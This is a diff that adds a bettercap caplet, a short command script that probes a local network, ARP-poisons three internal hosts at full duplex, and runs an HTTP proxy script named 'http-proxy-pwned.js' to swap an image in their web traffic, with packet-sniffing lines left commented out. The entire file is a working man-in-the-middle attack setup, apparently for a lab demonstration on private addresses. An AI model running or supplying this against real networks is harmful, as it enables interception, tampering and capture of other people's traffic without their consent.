@@ -1,0 +1,23 @@
+# discover hosts
+net.probe on
+sleep 3
+net.probe off
+
+# set gateway
+set gateway.address 192.168.100.1
+
+# option for arp poisoning
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+set arp.spoof.redirect false
+set arp.spoof.targets 192.168.100.10, 192.168.100.80, 192.168.100.200
+arp.spoof on
+
+# http proxy with custom script to replace the cute kitten image
+set http.proxy.script http-proxy-pwned.js
+http.proxy on
+
+# enable the sniffer and save it on the desktop
+#set net.sniff.verbose true
+#set net.sniff.output /home/user/Desktop/sniff_bettercap.pcap
+#net.sniff on
